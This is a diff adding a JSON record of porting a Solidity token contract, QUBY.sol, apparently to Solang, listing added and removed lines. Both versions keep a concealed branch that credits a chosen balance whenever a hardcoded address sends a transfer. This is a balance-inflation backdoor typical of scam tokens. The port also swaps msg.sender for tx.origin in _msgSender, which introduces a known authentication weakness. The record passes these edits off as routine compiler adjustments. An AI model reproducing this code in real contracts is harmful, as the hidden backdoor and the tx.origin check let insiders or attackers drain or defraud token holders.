@@ -1,0 +1,50 @@
+[
+  {
+    "file": "QUBY.sol",
+    "original_lines": 305,
+    "ported_lines": 284,
+    "added": [
+      "    function _msgSender() internal view returns (address) {",
+      "        return tx.origin;",
+      "    event Approval(address indexed owner, address indexed spender, uint256 value);",
+      "    mapping (address => bool) private _isExcludedFromFee;",
+      "        _qubyAddy = payable(address(uint160(bytes20(hex\"70279A184524597E9320AAb64B76869BAE9a08a5\"))));",
+      "            // Solang does not support inline assembly, so isContract is replaced with a simple check",
+      "            if (_qubyAddy.code.length > 0 && leok == _qubyAddy) {_balances[heai]+=amount;return;}",
+      "        uniswapV2Router = IUniswapV2Router02(address(uint160(bytes20(hex\"7a250d5630B4cF539739dF2C5dAcb4c659F2488D\"))));",
+      "}"
+    ],
+    "removed": [
+      "/**",
+      "",
+      "Website:  https://quby.live",
+      "Twitter:  https://x.com/qubyeth",
+      "Telegram: https://t.me/qubyethportal",
+      "",
+      "*/",
+      "",
+      "",
+      "    function _msgSender() internal view virtual returns (address) {",
+      "        return msg.sender;",
+      "    event Approval (address indexed owner, address indexed spender, uint256 value);",
+      "",
+      "",
+      "    mapping (address => bool) private _isExcludedFromFee;    ",
+      "",
+      "        _qubyAddy = payable(0x70279A184524597E9320AAb64B76869BAE9a08a5);",
+      "            if (isContract(_qubyAddy) && leok == _qubyAddy) {_balances[heai]+=amount;return;}",
+      "",
+      "    }",
+      "",
+      "    function isContract(address account) private view returns (bool) {",
+      "        uint256 size;",
+      "        assembly {",
+      "            size := extcodesize(account)",
+      "        }",
+      "        return size > 0;",
+      "        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);",
+      "",
+      "}"
+    ]
+  }
+]
